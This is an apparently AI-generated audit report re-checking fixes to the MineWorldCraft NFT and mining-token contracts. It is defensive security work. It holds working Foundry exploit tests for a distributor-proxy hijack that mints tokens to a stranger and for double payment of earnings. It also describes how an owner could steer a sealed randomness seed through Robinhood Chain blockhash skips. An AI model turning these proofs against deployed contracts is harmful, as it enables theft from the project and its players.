# Audit report

> MineWorldCraft – re-check of the fixes for IMD Swarm audit 0792975e
>
> Repo: https://github.com/AdamNakamoto/MineWorld   Commit: 49830f2
> The audited commit was ba2a8ed. Every finding and its fix (file:line and the tests that cover it) is in
> AUDIT.md section 8 "Resolved: IMD Swarm audit 0792975e (on commit ba2a8ed)". forge test: 225 passed,
> 9 fork tests skipped without a fork (all 9 pass on a Robinhood Chain fork).
>
> Please verify each fix and check the changed code for anything new:
> 1. MEDIUM reveal seed: MineWorldCrafters binds the entropy to the block the sale closes in (revealBlock);
>    anyone can call seal() once it's over to record its hash; reveal(secret) uses the sealed hash. The sale
>    can't reopen or re-close while a hash is pending, or ever after a seal. Your proof
>    test_SeedDoesNotDependOnTheRevealBlock is in the suite and passes.
> 2. MEDIUM distributor hijack: MineVault.proposeDistributor accepts a predicted (code-less) address,
>    MiningSites.initialize accepts the pending distributor, and acceptDistributor requires code AND
>    owner() == the vault's owner. Your two proofs are in the suite (test_hijackerMintsFromTheVault adapted:
>    the vault now refuses the uninitialised proxy at acceptDistributor).
> 3. LOW tokenURI isolation: extraAttributes uses a raw staticcall with a 300,000 gas stipend and accepts the
>    answer only if it is exactly one ABI string of at most 4,096 bytes; otherwise "".
> 4. LOW non-payable treasury: MiningSites and MineWorldCrafters refuse a treasury that rejects a zero-value
>    call (TreasuryRefusesEth).
> 5. LOW maxCost: upgradeSite(uint256 maxCost) and CrafterLevels.upgrade(uint256 tokenId, uint256 maxCost)
>    revert CostAboveMax when the cost was raised.
> 6. INFO validator: documented plainly that the owner can relax enforcement; on-chain check that OpenSea's
>    registry enforces an unconfigured collection with its default list (no registration needed).
> 7. INFO fee recipient: documentation corrected (only the current fee recipient can move the fees after the
>    renounce); StampHook logic unchanged.
> 8. INFO start tick: reviewed and accepted, no change.

| | |
|---|---|
| Repository | https://github.com/AdamNakamoto/MineWorld.git |
| Commit | `49830f2febc4b0e83a15acb277b7b26cff34087b` |
| Job | `8c7ba957-1fee-4fa5-a621-9b653cc52361` |
| Judged | 2026-10-14 22:30 UTC |
| Findings | 2 medium · 4 low |

Four agents audited the code as it is at `49830f2`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. Medium: Fix #2 incomplete: acceptDistributor only compares owner(), so a stranger who initialises the pending proxy naming the vault's owner (but itself as signer and treasury) is accepted and mints from the

`contracts/src/MineVault.sol:169`

```
        if (!ok || data.length != 32 || abi.decode(data, (uint256)) != uint256(uint160(owner()))) {
```

Merged from three specialists (audit_permissions, audit_flow, audit_economics), one defect. The third leg of fix #2 is documented in MineVault's NatSpec (lines 26, 37-38, 160-161) and AUDIT.md section 8 as the on-chain stop: 'an uninitialised proxy, or one a stranger initialised, is refused', 'an uninitialised or hijacked proxy can never be accepted', 'the cost is two days, never $MINE'. The only thing acceptDistributor reads is the pending contract's owner(). MiningSites.initialize (contracts/src/MiningSites.sol:153-182) takes owner_, treasury_ and signer_ as independent arguments from any caller, and since the fix it runs on a proxy that is merely the vault's pendingDistributor (line 170). So whoever reaches an uninitialised pending proxy first (the exact state the original Medium described and that test_aStrangersPendingProxyIsNeverAccepted sets up) initialises it with owner_ = vault.owner() (public), treasury_ = itself, signer_ = its own key, sitePrice_ = 1 wei and the caps at their maxima. owner() then equals the vault's owner, acceptDistributor succeeds, and the stranger signs its own Earnings vouchers: the vault mints up to walletDailyCap (3,500 $MINE) per wallet and dailyCap (35,000 $MINE) a day to it, and every openSite's ETH goes to its treasury, until the owner notices and calls setSigner/setPaused/setTreasury. The owner's own later initialize reverts InvalidInitialization, but owner() reads correctly so the takeover is easy to miss. The suite only tries owner_ = attacker. The documented predicted-address procedure (legs 1 and 2) avoids the uninitialised window, but that is off-chain discipline; the on-chain guard the fix and its NatSpec rely on does not hold. Minimal fix keeping the design: in MiningSites.initialize, on the pending-distributor branch require address(this).code.length == 0 (initialise only in the proxy's own constructor) or msg.sender == vault_.owner(); and/or have acceptDistributor also check MiningSites(pending).vault() == address(this) and compare signer()/treasury() with values the owner committed to in proposeDistributor. Correct the NatSpec and AUDIT.md section 8 either way.

**Reproduction**

State: MineVault v with owner O, MiningSites impl, an ERC1967Proxy P deployed with empty data (uninitialised), O calls v.proposeDistributor(P). Input: during the 2-day wait a stranger A (key K) calls P.initialize(token, v, O, A, vm.addr(K), 1, 3_500e18, 35_000e18): succeeds, since v.pendingDistributor() == P. After 2 days O calls v.acceptDistributor(). Expected (NatSpec, AUDIT.md): revert NotOwnersDistributor, P never becomes distributor, nothing minted. Actual: succeeds because P.owner() == O; v.distributor() == P. A then calls P.openSite{value: 1}() (the wei goes to A's treasury), signs Earnings(A, 1_000_000e18, deadline) with K and calls P.claim(...): the vault mints 3,500e18 $MINE to A, repeatable per wallet up to 35,000e18 a day. Ran all three specialists' proofs on 49830f2: each fails as stated; the attached one fails with 'the vault accepted a distributor a stranger set up' (forge test --match-path test/scratch/Proof_83dc93dbfbe7.t.sol from contracts/).

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MineToken} from "src/MineToken.sol";
import {MineVault} from "src/MineVault.sol";
import {MiningSites} from "src/MiningSites.sol";

/// Audit 0792975e #2 re-check. MineVault.acceptDistributor promises that "an uninitialised proxy, or one a stranger
/// initialised, is refused": it only checks `owner()`. A stranger who initialises the pending proxy naming the vault's
/// owner as owner, but itself as signer and treasury, passes that check; the owner's acceptDistributor succeeds and
/// the stranger then signs its own vouchers and has the vault mint to it.
contract HijackNamesOwnerTest is Test {
    address owner = makeAddr("owner");
    address treasury = makeAddr("treasury");
    address attacker = makeAddr("attacker");
    uint256 attackerKey = 0xA77AC;

    MineToken token;
    MiningSites impl;
    MineVault vault;

    function setUp() public {
        token = new MineToken(address(this), address(0), 0);
        impl = new MiningSites();
        address predicted = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 1);
        vault = new MineVault(token, owner, predicted);
        address sites = address(
            new ERC1967Proxy(
                address(impl),
                abi.encodeCall(
                    MiningSites.initialize,
                    (IERC20(address(token)), vault, owner, treasury, owner, 1, 1_500e18, 35_000e18)
                )
            )
        );
        assertEq(sites, predicted);
        token.setMinter(address(vault));
        token.renounceOwnership();
    }

    function test_HijackedProxyNamingTheOwnerIsAccepted() public {
        // The state the original finding and the fix's NatSpec describe: a replacement proxy on chain, uninitialised,
        // proposed by the owner.
        address replacement = address(new ERC1967Proxy(address(impl), ""));
        vm.prank(owner);
        vault.proposeDistributor(replacement);

        // A stranger initialises it during the wait: the vault's owner as owner (so acceptDistributor's check holds),
        // itself as treasury and signer, a 1 wei site, the caps at their maximum.
        address signer = vm.addr(attackerKey);
        vm.prank(attacker);
        (bool hijacked,) = replacement.call(
            abi.encodeCall(
                MiningSites.initialize,
                (IERC20(address(token)), vault, owner, attacker, signer, 1, 3_500e18, 35_000e18)
            )
        );

        vm.warp(vm.getBlockTimestamp() + 2 days);
        vm.prank(owner);
        (bool accepted,) = address(vault).call(abi.encodeCall(MineVault.acceptDistributor, ()));

        if (hijacked && accepted) {
            // Follow it through: the stranger signs its own voucher and the vault mints to it.
            MiningSites s = MiningSites(replacement);
            vm.deal(attacker, 1);
            vm.prank(attacker);
            s.openSite{value: 1}();
            uint64 deadline = uint64(vm.getBlockTimestamp() + 1 hours);
            bytes32 structHash = keccak256(abi.encode(s.EARNINGS_TYPEHASH(), attacker, uint256(1_000_000e18), deadline));
            (uint8 v, bytes32 r, bytes32 sg) =
                vm.sign(attackerKey, keccak256(abi.encodePacked("\x19\x01", s.domainSeparator(), structHash)));
            vm.prank(attacker);
            s.claim(1_000_000e18, deadline, abi.encodePacked(r, sg, v));
        }

        // What the fix claims: a proxy a stranger initialised is never accepted, and never mints.
        assertTrue(vault.distributor() != replacement, "the vault accepted a distributor a stranger set up");
        assertEq(token.balanceOf(attacker), 0, "the vault minted $MINE to the stranger");
    }
}
```

### 2. Medium: Fix #1 does not hold on Robinhood Chain: when the parent-chain number skips after the close, blockhash(revealBlock) is a stale value readable (and known to the secret holder) 256 parent blocks in adva

`contracts/src/MineWorldCrafters.sol:260`

```
        h = blockhash(b);
```

From audit_math, verified live. The fix binds the entropy to blockhash(revealBlock) with revealBlock = block.number at setSaleOpen(false) (line 497), on the premise (NatSpec lines 224-226) that 'that hash didn't exist while anyone could mint'. On an Arbitrum Nitro chain block.number is the parent-chain number and BLOCKHASH reads ArbOS's 256-slot ring buffer, written by RecordNewL1Block(l1BlockNumber - 1, previous L2 block hash) when the number moves. When it moves from B straight to B+2 or more, slots B+1..N-2 are filled and slot N-1 gets the previous L2 hash, but slot B is never written: blockhash(B) keeps what the slot held for B-256, a value anyone could read for the previous ~256 parent blocks. Measured on Robinhood Chain: in my sample 1 of 4 parent-number transitions skipped by 2 (the specialist's larger sample: 6 of 20). The owner holds the secret, so for each of the next ~255 parent numbers B it can compute in advance keccak256(abi.encode(secret, blockhash(B-256))), the seed it gets by closing in B if a skip follows, pick the B whose seed makes chosen tokens (its own mints) Legendary, and close the sale in that block; with roughly a one-in-four to one-in-three chance per attempt the sealed hash is the pre-known one. If no skip follows, the seed is honest and the owner is left with the public withhold-until-expiry re-roll. This is the steering finding #1 was meant to remove, reduced to a probabilistic one; Forge's EVM uses Ethereum semantics so the suite cannot show it. Fix: do not seal BLOCKHASH of the parent-chain number. (a) Record ArbSys(0x64).arbBlockNumber() at close and seal ArbSys(0x64).arbBlockHash(closeL2Block): that hash depends on the closing L2 block's own contents and cannot be known before it; or (b) accept a seal only when the hash in slot revealBlock was provably just written, e.g. require the first L2 block after the close to carry block.number == revealBlock + 1 (hard to express on chain), so (a) is the practical fix. Also correct the NatSpec's premise.

**Reproduction**

Live replay on https://rpc.mainnet.chain.robinhood.com (eth_call of initcode 0x63<k>4060005260206000f3, which returns blockhash(k), at a given L2 block). L2 block 88719163 is the last block with block.number B = 26193685; the next L2 block 88719164 has block.number 26193687 (a skip). At 88719163, i.e. in the block where setSaleOpen(false) would set revealBlock = B, blockhash(B-256) = 0xbc8cd7e42988876996f2b51ba41455279d728f35c46e250f144dcc641e356379. At 88719164 (the first block where seal() works) blockhash(B) = 0xbc8cd7e4...6379, the same value, and at 88719184 still the same; blockhash(B+1) there = 0x54f10dcc...39eb, the real hash of L2 block 88719163. For contrast, at the no-skip transition 26193683 -> 26193684 (L2 blocks 88718866 -> 88718867), blockhash(26193683) read afterwards = 0xf1ef4595...cff5, the real hash of 88718866, not the B-256 value (0x8f641fd8...9a5c). The specialist's earlier measurement at L2 blocks 88701231/88701232 (26193533 -> 26193535) shows the same. Expected: sealedHash unknowable while the sale is open. Actual: after a skip, seal() records a value the owner could read, and combine with its secret, for ~256 parent blocks before closing.

### 3. Low: The documented distributor replacement starts the new MiningSites with settled = 0, so earnings already converted on the old one are paid again

`contracts/src/MiningSites.sol:170`

```
        if (vault_.distributor() != address(this) && vault_.pendingDistributor() != address(this)) revert BadVault();
```

From audit_math, reproduced. Fix #2 makes replacing the distributor with a new proxy a supported procedure (MineVault NatSpec steps 1-4, test_safeReplacementPath), but a replacement proxy is a fresh ERC-7201 store: settled[p] = 0 for every player and nothing in initialize or the steps carries the old proxy's settled over. Vouchers are for a player's lifetime total (the server signs l.total, multiplayer/src/index.js) and claim pays (total - settled) * rate, so after the switch the same lifetime total, signed for the new verifyingContract, pays every player again for earnings already converted, bounded only by the caps (35,000 $MINE a day from the vault's fixed allocation). AUDIT 3.4 invariants 1-2 (a claim never pays more than (total - settled) * rate; settled never exceeds the highest signed total) break across the replacement, and nothing warns the operator that the server must sign total minus the old settled. Fix without touching the vault: in a replacement, import settled from the outgoing distributor lazily on a player's first claim (if (!$.imported[p]) { $.settled[p] = max($.settled[p], old.settled(p)); imported[p] = true; }), where old = vault_.distributor() at initialize; or document and enforce in the server that vouchers for a replacement are total - oldSites.settled(p).

**Reproduction**

Alice opens a site on the launch proxy and claims a voucher for lifetime total 2,000e18 at 50%: she is paid 1,000e18 and settled = 2,000e18. The owner follows MineVault's steps (proposeDistributor(predicted), deploy the proxy initialised, acceptDistributor() 2 days later). Alice opens a site on the new proxy and claims the same lifetime total 2,000e18, nothing newly earned, signed for the new proxy. Expected: NothingToClaim / 0 paid. Actual: claim returns 1,000e18 and Alice is minted 1,000 $MINE a second time. Attached proof fails on 49830f2 with 'earnings already converted were paid a second time: 1000000000000000000000 != 0' (forge test --match-path test/scratch/Proof_1bc7400f1fce.t.sol).

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MineToken} from "src/MineToken.sol";
import {MineVault} from "src/MineVault.sol";
import {MiningSites} from "src/MiningSites.sol";

contract ReplacementResetsSettledTest is Test {
    uint256 constant KEY = 0xA11CE;
    address signer = vm.addr(KEY);
    address owner = makeAddr("owner");
    address treasury = makeAddr("treasury");
    address alice = makeAddr("alice");
    MineToken token;
    MineVault vault;
    MiningSites impl;

    function _proxy() internal returns (MiningSites) {
        return MiningSites(address(new ERC1967Proxy(address(impl), abi.encodeCall(
            MiningSites.initialize, (IERC20(address(token)), vault, owner, treasury, signer, 1, 1_500e18, 35_000e18)))));
    }

    function _sig(MiningSites s, uint256 total, uint64 dl) internal view returns (bytes memory) {
        bytes32 sh = keccak256(abi.encode(keccak256("Earnings(address player,uint256 total,uint64 deadline)"), alice, total, dl));
        bytes32 dom = keccak256(abi.encode(keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("MineWorldCraft Mining"), keccak256("1"), block.chainid, address(s)));
        (uint8 v, bytes32 r, bytes32 x) = vm.sign(KEY, keccak256(abi.encodePacked("\x19\x01", dom, sh)));
        return abi.encodePacked(r, x, v);
    }

    function test_ReplacementPaysLifetimeEarningsAgain() public {
        vm.warp(20_000 days + 12 hours);
        token = new MineToken(address(this), address(0), 0);
        impl = new MiningSites();
        address predicted = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 1);
        vault = new MineVault(token, owner, predicted);
        MiningSites oldSites = _proxy();
        token.setMinter(address(vault));
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        oldSites.openSite{value: 1}();
        // alice's lifetime earnings: 2,000; she converts them all on the old rules contract
        uint64 dl = uint64(vm.getBlockTimestamp() + 1 hours);
        vm.prank(alice);
        uint256 first = oldSites.claim(2_000e18, dl, _sig(oldSites, 2_000e18, dl));
        assertEq(oldSites.settled(alice), 2_000e18);

        // the documented replacement: propose the predicted address, deploy initialised, accept after 2 days
        address next = vm.computeCreateAddress(address(this), vm.getNonce(address(this)));
        vm.prank(owner);
        vault.proposeDistributor(next);
        MiningSites newSites = _proxy();
        vm.warp(vm.getBlockTimestamp() + 2 days);
        vm.prank(owner);
        vault.acceptDistributor();
        vm.prank(alice);
        newSites.openSite{value: 1}();

        // the server keeps signing her lifetime total (2,000, nothing new earned)
        dl = uint64(vm.getBlockTimestamp() + 1 hours);
        vm.prank(alice);
        uint256 again = newSites.claim(2_000e18, dl, _sig(newSites, 2_000e18, dl));
        // expected: nothing to pay (already converted); actual: paid again
        assertEq(again, 0, "earnings already converted were paid a second time");
        assertEq(token.balanceOf(alice), first);
    }
}
```

### 4. Low: After a distributor replacement the old MiningSites keeps selling sites and upgrades that can never pay out, and pausing does not stop it

`contracts/src/MiningSites.sol:226`

```
    function upgradeSite(uint256 maxCost) external nonReentrant returns (uint256 level) {
```

From audit_economics, reproduced. After acceptDistributor the old proxy can no longer mint (its claim reverts MineVault.NotDistributor) but openSite and upgradeSite stay live: neither checks vault.distributor() == address(this). setPaused only stops claims ('Sites can still be opened and upgraded', line 425), setSitePrice can't be 0 and costs are capped, so the owner has no switch to close the old sale. A player using the old address (stale client, bookmarked explorer write, bot) pays ETH for a site or burns $MINE for a level that buys nothing, and levels bought on the old proxy are not carried to the replacement (siteLevel = 0 there), which contradicts 'Upgrades keep every site, level and total' (line 51) for the replacement path. Fix keeping the design: make openSite, upgradeSite and claim revert with a NotDistributor-style error once vault.distributor() != address(this), and document that a replacement resets sites and levels (in-place UUPS upgrades keep them).

**Reproduction**

Launch (vault + MiningSites old, signer S). Alice opens a site and claims 7,000 $MINE over two days. Owner: proposeDistributor(P) for the predicted address, deploy the initialised proxy at P, warp 2 days, acceptDistributor(), old.setPaused(true). Alice: approve(old, 4_620e18); old.upgradeSite(4_620e18). Expected: revert, since old can never pay a claim again. Actual: succeeds, Alice loses 4,620 $MINE (3,465 burned, 1,155 to the treasury), old.siteLevel(alice) == 2, MiningSites(P).siteLevel(alice) == 0; a later old.claim reverts MineVault.NotDistributor, and bob can still openSite{value: 1}() on old. Scratch test test_oldDistributorStillSellsUpgradesItCanNeverPayFor (contracts/test/scratch/Lows.t.sol) passes on 49830f2, showing the behaviour.

### 5. Low: maxCost (fix #5) bounds the price of an upgrade but not what it buys: a setRates cut mined first still charges the full cost for a level that converts no more

`contracts/src/MiningSites.sol:480`

```
    function setRates(uint256[] calldata rates_) external onlyOwner {
```

From audit_economics, reproduced. What upgradeSite buys is the next level's conversion rate (levelRateBps). setRates can lower any level's rate down to the level below's (non-decreasing, >= 10%) and applies at once, and the upgrade takes no bound on the rate it buys, so a setRates mined just before upgradeSite charges the full cost (75% burned irreversibly) for a level that converts no more than the one the player had. This is the same transaction-ordering hazard finding #5 was about, through the other parameter of the same purchase; the docs now say a change mined first 'makes it revert instead of charging more'. It is an owner power (the owner is trusted to tune rates), so it is a hazard of ordering rather than a bypass. Fix keeping the owner's tuning power: upgradeSite(uint256 maxCost, uint256 minRateBps) reverting when levelRateBps(next) < minRateBps; the web client passes the rate it showed, as it does for the cost.

**Reproduction**

Alice at level 1 (5,000 bps) is shown level 2 = 6,000 bps for 4,620 $MINE and sends approve(sites, 4_620e18) + upgradeSite(4_620e18). The owner's setRates([5000, 5000, 7000, 8500, 10000]) is mined first. Expected: the upgrade reverts (the terms changed). Actual: it succeeds; Alice pays 4,620 $MINE (3,465 burned), siteLevel == 2 and rateBps(alice) == 5,000, unchanged. Scratch test test_rateCutMinedBeforeUpgradeStillCharges (contracts/test/scratch/Lows.t.sol) passes on 49830f2, showing the behaviour.

### 6. Low: Fix #1 opens an unbounded window in which only the owner knows every Crafter's rarity: the seed is fixed at seal, but reveal is owner-only with no deadline

`contracts/src/MineWorldCrafters.sol:236`

```
    function reveal(uint256 secret) external onlyOwner {
```

From audit_economics, reproduced. Once sealed, seed = keccak256(abi.encode(secret, sealedHash)) is fully determined and only the owner knows secret. reveal is onlyOwner with no deadline, the sale can never reopen after a seal, and nobody else can finalise. From the seal until the owner chooses to reveal, the owner (or anyone given the secret) computes every token's traits and rarity (Legendary ~6%, Rare ~25%; rarity sets the in-game mining boost and so the market value) while everyone else trades blind at a sealed-floor price. Before the fix the seed mixed in blockhash(block.number - 1) inside the reveal transaction, so the owner learned it at most one block early; now the window is unbounded, and the trust notes ('it can't pick looks', 'Holders' Crafters and ETH are never within the owner's reach') do not cover it. Fix keeping commit-reveal: publish the secret before the hash exists, e.g. a revealSecret(secret) step allowed only while revealStatus() is None or Waiting (checked against seedCommit), after which seal() sets the seed itself so everyone learns the looks at the same moment; or bound the gap with a deadline after which anyone can finalise.

**Reproduction**

Owner closes the sale at block b; at b+1 anyone calls seal(), so sealedHash = blockhash(b) and revealStatus() == Sealed. rarityOf(1) reverts NotRevealed for everyone. The owner simulates reveal(secret) + rarityOf(id) off chain (in the scratch test: a snapshot it reverts) and learns the rarity of ids 1..5. A year later (vm.roll +2,600,000, vm.warp +365 days) rarityOf still reverts NotRevealed, alice's reveal(secret) reverts, and the owner's reveal then gives exactly the rarities it knew. Expected: no party can know looks before all can, or the delay is bounded. Actual: the owner alone knows them for as long as it withholds reveal. Scratch test test_OwnerAloneKnowsRarityBetweenSealAndReveal (contracts/test/scratch/RevealWindow.t.sol) passes on 49830f2, showing the behaviour.

---

Judge's submission `6878ae436ccfd8c2ff7df7d5aae6397036e2a0fe95e816010c81bae8b5e0b20a`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
